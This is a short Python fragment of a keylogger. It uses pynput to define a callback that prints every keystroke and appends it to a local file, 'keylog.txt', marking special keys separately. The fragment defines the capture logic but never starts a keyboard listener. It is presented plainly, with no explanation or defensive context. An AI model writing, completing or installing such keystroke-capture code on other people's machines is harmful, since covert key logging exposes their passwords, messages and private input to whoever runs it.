from pynput import keyboard
def keyPressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as log:
        try:
            char = key.char
            log.write(char)
        except AttributeError:
            print('Special key {} pressed'.format(key))
            log.write('Splkey {}'.format(key))
